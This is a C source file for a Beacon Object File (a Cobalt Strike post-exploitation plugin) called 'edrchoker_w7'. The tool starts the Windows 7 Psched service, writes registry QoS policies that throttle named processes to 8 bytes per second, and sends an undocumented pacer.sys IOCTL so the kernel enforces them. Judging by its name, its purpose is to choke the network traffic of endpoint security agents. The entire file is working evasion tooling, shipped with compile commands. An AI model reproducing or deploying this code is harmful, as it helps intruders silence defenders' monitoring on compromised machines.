/*
 * edrchoker_w7.bof.c — Beacon Object File
 *
 * Win7 QoS throttle: SCM service start + v1.0 registry + pacer.sys ZAW trigger.
 *
 * MECHANISM
 * ---------
 * Windows 7 pacer.sys (NDIS6 rewrite) includes kernel-mode per-process QoS
 * enforcement. When it receives IOCTL 0x128050 (ZAW event), it reads the v1.0
 * registry format and applies per-process throttle rules WITHOUT needing any
 * userland "QoS Policy Manager" service. This is different from Win10/11 where
 * that kernel-mode component was removed.
 *
 * Steps:
 *   1. EnsureServiceRunning("Psched") — start pacer.sys if stopped
 *   2. Write v1.0 registry policies (same format as edrchoker_v3)
 *   3. Send IOCTL 0x128050 (ZAW event) to \\.\PSCHED — kernel enforces immediately
 *
 * WHY NOT edrchoker_v2 ON WIN7:
 *   MSFT_NetQosPolicySettingData WMI class was introduced in Windows 8 /
 *   Server 2012. It does not exist on Windows 7. GetObject() returns
 *   WBEM_E_NOT_FOUND (0x80041002) — hence v2 fails completely on Win7.
 *
 * WHY NOT edrchoker_v3 AS-IS:
 *   v3 writes registry and sends ZAW but does not start Psched if it is stopped.
 *   This BOF adds service management so it is fully self-contained for Win7 targets.
 *
 * MODES
 *   add        — start Psched if needed, write v1.0 policies, ZAW trigger
 *   remove     — delete matching policies, ZAW trigger
 *   remove_all — delete all edrchoker_ policies, ZAW trigger
 *   list       — enumerate v1.0 policies from registry
 *   check      — print Psched state + list active policies
 *
 * COMPILE AS C, NOT C++
 *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker_w7.x64.o -c edrchoker_w7.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foedrchoker_w7.x64.obj edrchoker_w7.bof.c
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE, LPSERVICE_STATUS);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*  WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

/* ─── Constants ──────────────────────────────────────────────────────────── */
/* IOCTL_PSCHED_ZAW_EVENT — signals pacer.sys to re-read v1.0 registry policies.
 * On Win7, pacer.sys enforces per-process rules directly at NDIS level.
 * Discovered by reversing gptext.dll!ProcessPSCHEDPolicy (ordinal 3):
 * the entire Group Policy QoS CSE is: CreateFile + DeviceIoControl(this) + CloseHandle. */
#define IOCTL_PSCHED_ZAW_EVENT  0x00128050

static DWORD g_randS = 0;

/* ─── String helpers ─────────────────────────────────────────────────────── */

static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *c = p + 1; } else { *c = p; }
    return s;
}

static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

static BOOL InList(const wchar_t* list, const wchar_t* needle) {
    const wchar_t* p = list;
    while (*p) {
        while (*p == L';') p++;
        if (!*p) break;
        const wchar_t* start = p;
        while (*p && *p != L';') p++;
        int segLen = (int)(p - start);
        int nLen = 0; while (needle[nLen]) nLen++;
        if (segLen == nLen) {
            int eq = 1;
            int i;
            for (i = 0; i < segLen; i++) {
                if (start[i] != needle[i]) { eq = 0; break; }
            }
            if (eq) return TRUE;
        }
    }
    return FALSE;
}

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    int i;
    for (i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* ─── Registry helpers ───────────────────────────────────────────────────── */

static BOOL SetRegStr(HKEY hKey, const wchar_t* name, const wchar_t* val) {
    int len = 0; while (val[len]) len++;
    DWORD sz = (DWORD)((len + 1) * sizeof(wchar_t));
    return ADVAPI32$RegSetValueExW(hKey, name, 0, REG_SZ,
        (const BYTE*)val, sz) == ERROR_SUCCESS;
}

/* ─── Service management ─────────────────────────────────────────────────── */

/* Returns current service state (SERVICE_*) or 0 on error.
 * Also starts the service if it is stopped and start=TRUE. */
static DWORD ServiceManage(const wchar_t* svcName, BOOL start) {
    SC_HANDLE scm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;

    DWORD access = SERVICE_QUERY_STATUS;
    if (start) access |= SERVICE_START;

    SC_HANDLE svc = ADVAPI32$OpenServiceW(scm, svcName, access);
    if (!svc) {
        ADVAPI32$CloseServiceHandle(scm);
        return 0;
    }

    SERVICE_STATUS ss;
    DWORD state = 0;
    if (ADVAPI32$QueryServiceStatus(svc, &ss)) {
        state = ss.dwCurrentState;
        if (start && state == SERVICE_STOPPED) {
            if (ADVAPI32$StartServiceW(svc, 0, NULL)) {
                state = SERVICE_START_PENDING;
            }
        }
    }

    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
    return state;
}

static const wchar_t* StateName(DWORD state) {
    if (state == SERVICE_RUNNING)       return L"RUNNING";
    if (state == SERVICE_STOPPED)       return L"STOPPED";
    if (state == SERVICE_START_PENDING) return L"START_PENDING";
    if (state == SERVICE_STOP_PENDING)  return L"STOP_PENDING";
    if (state == SERVICE_PAUSED)        return L"PAUSED";
    if (state == 0)                     return L"NOT FOUND";
    return L"UNKNOWN";
}

/* ─── pacer.sys trigger ──────────────────────────────────────────────────── */

static void TriggerPsched(void) {
    HANDLE h = KERNEL32$CreateFileW(
        L"\\\\.\\PSCHED",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] PSCHED open failed (err=%lu) — Psched not running?\n",
            KERNEL32$GetLastError());
        return;
    }
    DWORD br = 0;
    BOOL ok = KERNEL32$DeviceIoControl(
        h, IOCTL_PSCHED_ZAW_EVENT,
        NULL, 0, NULL, 0, &br, NULL);
    KERNEL32$CloseHandle(h);
    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [*] pacer.sys ZAW event sent — Win7 kernel enforces policy immediately\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] ZAW IOCTL failed (err=%lu)\n", KERNEL32$GetLastError());
    }
}

/* ─── QoS policy operations ──────────────────────────────────────────────── */

static BOOL CreateQosPolicy(const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);

    wchar_t path[128];
    int p = WAppend(path, 0, 128, L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\");
    p = WAppend(path, p, 128, name);
    path[p] = L'\0';

    HKEY hKey = NULL;
    DWORD disp;
    LONG rc = ADVAPI32$RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, path, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS || !hKey) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] %S: RegCreateKeyEx failed (%ld)\n", proc, rc);
        return FALSE;
    }

    /* v1.0 format — read by pacer.sys on Win7 after receiving ZAW IOCTL.
     * Throttle Rate "8" = 8 bytes/sec — effectively zero bandwidth. */
    BOOL ok = TRUE;
    ok &= SetRegStr(hKey, L"Version",          L"1.0");
    ok &= SetRegStr(hKey, L"Application Name", proc);
    ok &= SetRegStr(hKey, L"Protocol",         L"*");
    ok &= SetRegStr(hKey, L"Local Port",       L"*");
    ok &= SetRegStr(hKey, L"Local IP",         L"*");
    ok &= SetRegStr(hKey, L"Remote Port",      L"*");
    ok &= SetRegStr(hKey, L"Remote IP",        L"*");
    ok &= SetRegStr(hKey, L"DSCP Value",       L"-1");
    ok &= SetRegStr(hKey, L"Throttle Rate",    L"8");

    ADVAPI32$RegCloseKey(hKey);

    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> key '%S'\n", proc, name);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "  [-] %S: RegSetValueEx partial fail\n", proc);
    }
    return ok;
}

static int DeleteQosPolicies(const wchar_t* matchList) {
    HKEY hParent = NULL;
    /* KEY_SET_VALUE required: RegDeleteKeyW needs write rights on the parent. */
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] QoS registry key not found\n");
        return 0;
    }

    const int MAX_KEYS = 64;
    const int NAME_LEN = 256;
    wchar_t* namesBuf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)(MAX_KEYS * NAME_LEN * sizeof(wchar_t)),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!namesBuf) {
        ADVAPI32$RegCloseKey(hParent);
        return 0;
    }

    int nNames = 0;
    DWORD idx;
    for (idx = 0; nNames < MAX_KEYS; idx++) {
        DWORD subLen = NAME_LEN;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, namesBuf + nNames * NAME_LEN,
            &subLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        nNames++;
    }

    int n = 0;
    int i;
    for (i = 0; i < nNames; i++) {
        wchar_t* sub = namesBuf + i * NAME_LEN;

        wchar_t appName[128];
        BOOL hasApp = FALSE;
        BOOL isMine = TRUE;
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                hasApp = TRUE;

            /* remove_all: only delete policies we own (Throttle Rate = "8") */
            if (matchList == NULL) {
                wchar_t thr[16];
                DWORD thrLen = (DWORD)sizeof(thr);
                DWORD thrType = 0;
                isMine = (ADVAPI32$RegQueryValueExW(hSub, L"Throttle Rate", NULL, &thrType,
                    (LPBYTE)thr, &thrLen) == ERROR_SUCCESS &&
                    thrType == REG_SZ && thr[0] == L'8' && thr[1] == L'\0');
            }
            ADVAPI32$RegCloseKey(hSub);
        }

        if (matchList != NULL) {
            if (!hasApp || !InList(matchList, appName)) continue;
        }
        if (matchList == NULL && !isMine) continue;

        if (ADVAPI32$RegDeleteKeyW(hParent, sub) == ERROR_SUCCESS) {
            if (hasApp) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [+] restored: %S\n", appName);
            }
            n++;
        }
    }

    KERNEL32$VirtualFree(namesBuf, 0, MEM_RELEASE);
    ADVAPI32$RegCloseKey(hParent);
    return n;
}

static void ListQosPolicies(void) {
    HKEY hParent = NULL;
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies (key not found)\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_w7] 0 QoS policy(s)\n");
        return;
    }

    int n = 0;
    DWORD idx;
    for (idx = 0; ; idx++) {
        wchar_t sub[256];
        DWORD subLen = 256;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, sub, &subLen,
            NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        wchar_t appName[128];
        const wchar_t* sApp = L"?";
        BOOL isMine = FALSE;
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                sApp = appName;

            wchar_t thr[16];
            DWORD thrLen = (DWORD)sizeof(thr);
            DWORD thrType = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Throttle Rate", NULL, &thrType,
                (LPBYTE)thr, &thrLen) == ERROR_SUCCESS &&
                thrType == REG_SZ && thr[0] == L'8' && thr[1] == L'\0')
                isMine = TRUE;

            ADVAPI32$RegCloseKey(hSub);
        }
        if (!isMine) continue;

        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] %S  key='%S'\n", sApp, sub);
        n++;
    }
    ADVAPI32$RegCloseKey(hParent);

    if (n == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies found\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_w7] %d QoS policy(s)\n", n);
}

/* ─── Entry point ────────────────────────────────────────────────────────── */
/*
 * Args: bof_pack($bid, "zz", cmd, process_list)
 *
 * "add"        → mode 0: start Psched + write registry + ZAW
 * "remove"     → mode 1: delete matching + ZAW
 * "remove_all" → mode 2: delete all owned + ZAW
 * "list"       → mode 3: list policies
 * "check"      → mode 4: print Psched state + list policies
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   cmdN = 0;
    char* cmdA = BeaconDataExtract(&parser, &cmdN);
    int   argN = 0;
    char* argA = BeaconDataExtract(&parser, &argN);

    wchar_t cmd[32];
    int ci = 0;
    if (cmdA) {
        for (; ci < 31 && cmdA[ci]; ci++)
            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
    }
    cmd[ci] = L'\0';

    LONG mode = 0;
    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
    if (cmd[0] == L'l')                     mode = 3;
    if (cmd[0] == L'c')                     mode = 4;

    const int PLEN = 2048;
    wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)PLEN * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker_w7: alloc failed\n");
        return;
    }
    if (argA && argN > 1) {
        int n = argN - 1;
        if (n >= PLEN) n = PLEN - 1;
        int i;
        for (i = 0; i < n; i++)
            buf[i] = (wchar_t)(unsigned char)argA[i];
    }

    /* ── MODE 0: start Psched + write registry + ZAW trigger ─────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_w7 add \"proc1.exe;proc2.exe\"\n");
            goto cleanup;
        }

        /* Ensure Psched is running — pacer.sys must be loaded for ZAW to work */
        DWORD state = ServiceManage(L"Psched", TRUE);
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [svc] Psched: %S\n", StateName(state));
        if (state == SERVICE_STOPPED) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] Psched failed to start — cannot enforce QoS\n");
            goto cleanup;
        }
        if (state == 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] Psched not found on this system\n");
            goto cleanup;
        }

        wchar_t* tb = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, (SIZE_T)PLEN * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        int ok = 0, fail = 0;
        if (tb) {
            KERNEL32$RtlMoveMemory(tb, buf, (SIZE_T)(PLEN - 1) * sizeof(wchar_t));
            wchar_t* c = tb; wchar_t* tok;
            while ((tok = WNextTok(&c)) != NULL) {
                if (CreateQosPolicy(tok)) { ok++; } else { fail++; }
            }
            KERNEL32$VirtualFree(tb, 0, MEM_RELEASE);
        }

        int cbT;
        if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_w7] %d policy(s) created, %d failed\n", ok, fail);

        if (ok > 0) {
            TriggerPsched();
        }

    /* ── MODE 1: remove specific ─────────────────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_w7 remove \"proc.exe\"\n");
            goto cleanup;
        }
        int n = DeleteQosPolicies(buf);
        int cbT;
        if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_w7] %d policy(s) removed\n", n);
        if (n > 0) { TriggerPsched(); }

    /* ── MODE 2: remove all ──────────────────────────────────────────────── */
    } else if (mode == 2) {
        int n = DeleteQosPolicies(NULL);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[edrchoker_w7] %d QoS policy(s) removed\n", n);
        if (n > 0) { TriggerPsched(); }

    /* ── MODE 3: list ────────────────────────────────────────────────────── */
    } else if (mode == 3) {
        ListQosPolicies();

    /* ── MODE 4: check ───────────────────────────────────────────────────── */
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_w7] diagnostics:\n");
        DWORD pschedState = ServiceManage(L"Psched", FALSE);
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [svc] Psched:    %S\n", StateName(pschedState));
        if (pschedState != SERVICE_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] Psched not running — QoS cannot be enforced\n"
                "  [!] Run:  edrchoker_w7 add <procs>  to auto-start it\n");
        }
        ListQosPolicies();
    }

cleanup:
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}
